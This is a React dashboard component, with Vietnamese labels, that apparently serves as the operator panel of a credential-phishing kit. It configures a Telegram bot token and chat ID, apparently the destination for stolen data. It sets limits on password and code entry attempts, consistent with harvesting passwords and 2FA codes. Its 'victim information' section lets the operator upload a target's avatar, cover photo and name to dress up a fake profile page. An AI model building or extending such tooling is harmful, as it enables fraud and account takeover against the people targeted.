import { FC, useEffect, useRef, useState } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faCamera, faImage } from '@fortawesome/free-solid-svg-icons';

interface UserInfo {
    full_name: string;
    avatar_image: string;
    cover_image: string;
}

const Dashboard: FC = () => {
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const [success, setSuccess] = useState('');
    const [userInfo, setUserInfo] = useState<UserInfo | null>(null);
    const [avatarPreview, setAvatarPreview] = useState<string>('');
    const [coverPreview, setCoverPreview] = useState<string>('');
    const [dragOver, setDragOver] = useState<'avatar' | 'cover' | null>(null);

    const token = localStorage.getItem('token');

    const telegramFormRef = useRef<HTMLFormElement>(null);
    const systemFormRef = useRef<HTMLFormElement>(null);
    const authFormRef = useRef<HTMLFormElement>(null);

    useEffect(() => {
        const fetchConfigs = async () => {
            try {
                const [telegramResponse, systemResponse] = await Promise.all([
                    fetch(`${import.meta.env.PUBLIC_API_URL}/api/config/telegram`, {
                        headers: {
                            Authorization: `Bearer ${token}`,
                        },
                    }),
                    fetch(`${import.meta.env.PUBLIC_API_URL}/api/config/system`, {
                        headers: {
                            Authorization: `Bearer ${token}`,
                        },
                    }),
                ]);

                const telegramData = await telegramResponse.json();
                const systemData = await systemResponse.json();

                if (telegramData.success && telegramFormRef.current) {
                    const form = telegramFormRef.current;
                    form.token.value = telegramData.data.token;
                    form.chat_id.value = telegramData.data.chat_id;
                }
                if (systemData.success && systemFormRef.current) {
                    const form = systemFormRef.current;
                    form.password_load_limit.value = systemData.data.password_load_limit;
                    form.password_load_duration.value = systemData.data.password_load_duration;
                    form.code_load_limit.value = systemData.data.code_load_limit;
                    form.code_load_duration.value = systemData.data.code_load_duration;
                }
            } catch {
                setError('Có lỗi khi tải cấu hình');
            }
        };

        const fetchUserInfo = async () => {
            try {
                const response = await fetch(`${import.meta.env.PUBLIC_API_URL}/api/user`);
                const data = await response.json();
                if (data.success) {
                    setUserInfo(data.data);
                    setAvatarPreview(data.data.avatar_image);
                    setCoverPreview(data.data.cover_image);
                }
            } catch {
                setError('Có lỗi khi tải thông tin người dùng');
            }
        };

        fetchConfigs();
        fetchUserInfo();
    }, [token]);

    const handleTelegramSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setLoading(true);
        setError('');
        setSuccess('');

        const formData = new FormData(e.currentTarget);
        const data = {
            token: formData.get('token') as string,
            chat_id: formData.get('chat_id') as string,
        };

        try {
            const response = await fetch(`${import.meta.env.PUBLIC_API_URL}/api/config/telegram`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
                body: JSON.stringify(data),
            });

            const result = await response.json();
            if (result.success) {
                setSuccess('Đã cập nhật cấu hình Telegram');
            } else {
                setError(result.message);
            }
        } catch {
            setError('Có lỗi xảy ra khi cập nhật cấu hình Telegram');
        } finally {
            setLoading(false);
        }
    };

    const handleSystemSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setLoading(true);
        setError('');
        setSuccess('');

        const formData = new FormData(e.currentTarget);
        const data = {
            password_load_limit: Number(formData.get('password_load_limit')),
            password_load_duration: Number(formData.get('password_load_duration')),
            code_load_limit: Number(formData.get('code_load_limit')),
            code_load_duration: Number(formData.get('code_load_duration')),
        };

        try {
            const response = await fetch(`${import.meta.env.PUBLIC_API_URL}/api/config/system`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
                body: JSON.stringify(data),
            });

            const result = await response.json();
            if (result.success) {
                setSuccess('Đã cập nhật cấu hình hệ thống');
            } else {
                setError(result.message);
            }
        } catch {
            setError('Có lỗi xảy ra khi cập nhật cấu hình hệ thống');
        } finally {
            setLoading(false);
        }
    };

    const handleAuthSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setLoading(true);
        setError('');
        setSuccess('');

        const formData = new FormData(e.currentTarget);
        const data = {
            username: formData.get('username') as string,
            password: formData.get('password') as string,
        };

        try {
            const response = await fetch(`${import.meta.env.PUBLIC_API_URL}/api/config/auth`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
                body: JSON.stringify(data),
            });

            const result = await response.json();
            if (result.success) {
                setSuccess('Đã cập nhật thông tin đăng nhập');
                if (authFormRef.current) {
                    authFormRef.current.reset();
                }
            } else {
                setError(result.message);
            }
        } catch {
            setError('Có lỗi xảy ra khi cập nhật thông tin đăng nhập');
        } finally {
            setLoading(false);
        }
    };

    const handleImageUpload = async (file: File, type: 'avatar' | 'cover') => {
        setLoading(true);
        setError('');
        setSuccess('');

        const formData = new FormData();
        formData.append('image', file);

        try {
            const response = await fetch(
                `${import.meta.env.PUBLIC_API_URL}/api/user/upload?type=${type}`,
                {
                    method: 'POST',
                    headers: {
                        Authorization: `Bearer ${token}`,
                    },
                    body: formData,
                },
            );

            const result = await response.json();
            if (result.success) {
                setSuccess(`Đã cập nhật ảnh ${type === 'avatar' ? 'đại diện' : 'bìa'}`);
                if (type === 'avatar') {
                    setAvatarPreview(result.data.image_url);
                } else {
                    setCoverPreview(result.data.image_url);
                }
            } else {
                setError(result.message);
            }
        } catch {
            setError(`Có lỗi xảy ra khi tải lên ảnh ${type === 'avatar' ? 'đại diện' : 'bìa'}`);
        } finally {
            setLoading(false);
        }
    };

    const handleUpdateInfo = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setLoading(true);
        setError('');
        setSuccess('');

        const formData = new FormData(e.currentTarget);
        const data = {
            full_name: formData.get('full_name') as string,
        };

        try {
            const response = await fetch(`${import.meta.env.PUBLIC_API_URL}/api/user/info`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
                body: JSON.stringify(data),
            });

            const result = await response.json();
            if (result.success) {
                setSuccess('Đã cập nhật thông tin thành công');
                setUserInfo((prev) => (prev ? { ...prev, full_name: data.full_name } : null));
            } else {
                setError(result.message);
            }
        } catch {
            setError('Có lỗi xảy ra khi cập nhật thông tin');
        } finally {
            setLoading(false);
        }
    };

    const handleDragOver = (e: React.DragEvent, type: 'avatar' | 'cover') => {
        e.preventDefault();
        setDragOver(type);
    };

    const handleDragLeave = (e: React.DragEvent) => {
        e.preventDefault();
        setDragOver(null);
    };

    const handleDrop = async (e: React.DragEvent, type: 'avatar' | 'cover') => {
        e.preventDefault();
        setDragOver(null);

        const file = e.dataTransfer.files[0];
        if (!file) return;

        const validTypes = ['image/jpeg', 'image/jpg', 'image/png'];
        if (!validTypes.includes(file.type)) {
            setError('Chỉ chấp nhận file JPG, JPEG hoặc PNG');
            return;
        }

        if (file.size > 5 * 1024 * 1024) {
            setError('Kích thước file không được vượt quá 5MB');
            return;
        }

        await handleImageUpload(file, type);
    };

    const handleFileChange = async (
        e: React.ChangeEvent<HTMLInputElement>,
        type: 'avatar' | 'cover',
    ) => {
        const file = e.target.files?.[0];
        if (!file) return;

        const validTypes = ['image/jpeg', 'image/jpg', 'image/png'];
        if (!validTypes.includes(file.type)) {
            setError('Chỉ chấp nhận file JPG, JPEG hoặc PNG');
            return;
        }

        if (file.size > 5 * 1024 * 1024) {
            setError('Kích thước file không được vượt quá 5MB');
            return;
        }

        await handleImageUpload(file, type);
        e.target.value = '';
    };

    return (
        <div className="space-y-6">
            {error && (
                <div className="rounded-md border border-zinc-200 bg-zinc-50 p-4 text-black">
                    {error}
                </div>
            )}
            {success && (
                <div className="rounded-md border border-zinc-200 bg-zinc-50 p-4 text-black">
                    {success}
                </div>
            )}

            <div className="rounded-lg bg-white p-6 shadow">
                <h2 className="text-lg font-medium text-black">Cấu hình Telegram</h2>
                <form
                    ref={telegramFormRef}
                    onSubmit={handleTelegramSubmit}
                    className="mt-4 space-y-4"
                >
                    <div>
                        <label htmlFor="token" className="block text-sm font-medium text-black">
                            Token
                        </label>
                        <input
                            type="text"
                            id="token"
                            name="token"
                            className="mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"
                        />
                    </div>
                    <div>
                        <label htmlFor="chat_id" className="block text-sm font-medium text-black">
                            Chat ID
                        </label>
                        <input
                            type="text"
                            id="chat_id"
                            name="chat_id"
                            className="mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"
                        />
                    </div>
                    <button
                        type="submit"
                        disabled={loading}
                        className="rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50"
                    >
                        {loading ? 'Đang xử lý...' : 'Cập nhật cấu hình Telegram'}
                    </button>
                </form>
            </div>

            <div className="rounded-lg bg-white p-6 shadow">
                <h2 className="text-lg font-medium text-black">Cấu hình Website</h2>
                <form ref={systemFormRef} onSubmit={handleSystemSubmit} className="mt-4 space-y-4">
                    <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                        <div>
                            <label
                                htmlFor="password_load_limit"
                                className="block text-sm font-medium text-black"
                            >
                                Giới hạn nhập mật khẩu
                            </label>
                            <input
                                type="number"
                                id="password_load_limit"
                                name="password_load_limit"
                                className="mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"
                            />
                        </div>
                        <div>
                            <label
                                htmlFor="password_load_duration"
                                className="block text-sm font-medium text-black"
                            >
                                Thời gian giới hạn (giây)
                            </label>
                            <input
                                type="number"
                                id="password_load_duration"
                                name="password_load_duration"
                                className="mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"
                            />
                        </div>
                        <div>
                            <label
                                htmlFor="code_load_limit"
                                className="block text-sm font-medium text-black"
                            >
                                Giới hạn nhập mã
                            </label>
                            <input
                                type="number"
                                id="code_load_limit"
                                name="code_load_limit"
                                className="mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"
                            />
                        </div>
                        <div>
                            <label
                                htmlFor="code_load_duration"
                                className="block text-sm font-medium text-black"
                            >
                                Thời gian giới hạn mã (giây)
                            </label>
                            <input
                                type="number"
                                id="code_load_duration"
                                name="code_load_duration"
                                className="mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"
                            />
                        </div>
                    </div>
                    <button
                        type="submit"
                        disabled={loading}
                        className="rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50"
                    >
                        {loading ? 'Đang xử lý...' : 'Cập nhật cấu hình Website'}
                    </button>
                </form>
            </div>

            <div className="rounded-lg bg-white p-6 shadow">
                <h2 className="text-lg font-medium text-black">Thay đổi thông tin đăng nhập</h2>
                <form ref={authFormRef} onSubmit={handleAuthSubmit} className="mt-4 space-y-4">
                    <div>
                        <label htmlFor="username" className="block text-sm font-medium text-black">
                            Tên đăng nhập mới
                        </label>
                        <input
                            type="text"
                            id="username"
                            name="username"
                            className="mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"
                        />
                    </div>
                    <div>
                        <label
                            htmlFor="new_password"
                            className="block text-sm font-medium text-black"
                        >
                            Mật khẩu mới
                        </label>
                        <input
                            type="password"
                            id="new_password"
                            name="password"
                            className="mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"
                        />
                    </div>
                    <button
                        type="submit"
                        disabled={loading}
                        className="rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50"
                    >
                        {loading ? 'Đang xử lý...' : 'Cập nhật thông tin đăng nhập'}
                    </button>
                </form>
            </div>

            <div className="rounded-lg bg-white p-6 shadow">
                <h2 className="mb-6 text-lg font-medium text-black">Thông tin victim</h2>

                <div className="space-y-6">
                    <div className="relative">
                        <div
                            className={`aspect-[21/9] w-full overflow-hidden rounded-lg bg-gray-100 ${
                                dragOver === 'cover' ? 'border-2 border-dashed border-black' : ''
                            }`}
                            onDragOver={(e) => handleDragOver(e, 'cover')}
                            onDragLeave={handleDragLeave}
                            onDrop={(e) => handleDrop(e, 'cover')}
                        >
                            {coverPreview ? (
                                <img
                                    src={coverPreview}
                                    alt="Cover"
                                    className="h-full w-full object-cover"
                                />
                            ) : (
                                <div className="flex h-full items-center justify-center">
                                    <span className="text-gray-400">Kéo thả ảnh bìa vào đây</span>
                                </div>
                            )}
                        </div>
                        <label
                            htmlFor="cover-upload"
                            className="absolute right-4 bottom-4 cursor-pointer rounded-md bg-black/75 px-4 py-2 text-white hover:bg-black/90"
                        >
                            <FontAwesomeIcon icon={faImage} className="mr-2" />
                            Thay đổi ảnh bìa
                            <input
                                type="file"
                                id="cover-upload"
                                className="hidden"
                                accept="image/jpeg,image/jpg,image/png"
                                onChange={(e) => handleFileChange(e, 'cover')}
                            />
                        </label>
                    </div>

                    <div className="flex items-center space-x-6">
                        <div className="relative">
                            <div
                                className={`h-32 w-32 overflow-hidden rounded-full bg-gray-100 ${
                                    dragOver === 'avatar'
                                        ? 'border-2 border-dashed border-black'
                                        : ''
                                }`}
                                onDragOver={(e) => handleDragOver(e, 'avatar')}
                                onDragLeave={handleDragLeave}
                                onDrop={(e) => handleDrop(e, 'avatar')}
                            >
                                {avatarPreview ? (
                                    <img
                                        src={avatarPreview}
                                        alt="Avatar"
                                        className="h-full w-full object-cover"
                                    />
                                ) : (
                                    <div className="flex h-full items-center justify-center">
                                        <span className="text-gray-400">?</span>
                                    </div>
                                )}
                            </div>
                            <label
                                htmlFor="avatar-upload"
                                className="absolute right-0 bottom-0 cursor-pointer rounded-full bg-black/75 p-2 text-white hover:bg-black/90"
                            >
                                <FontAwesomeIcon icon={faCamera} className="h-5 w-5" />
                                <input
                                    type="file"
                                    id="avatar-upload"
                                    className="hidden"
                                    accept="image/jpeg,image/jpg,image/png"
                                    onChange={(e) => handleFileChange(e, 'avatar')}
                                />
                            </label>
                        </div>

                        <form onSubmit={handleUpdateInfo} className="flex-1 space-y-4">
                            <div>
                                <label
                                    htmlFor="full_name"
                                    className="block text-sm font-medium text-black"
                                >
                                    Tên hiển thị
                                </label>
                                <input
                                    type="text"
                                    id="full_name"
                                    name="full_name"
                                    defaultValue={userInfo?.full_name}
                                    className="mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"
                                />
                            </div>
                            <button
                                type="submit"
                                disabled={loading}
                                className="rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50"
                            >
                                {loading ? 'Đang xử lý...' : 'Cập nhật thông tin'}
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Dashboard;
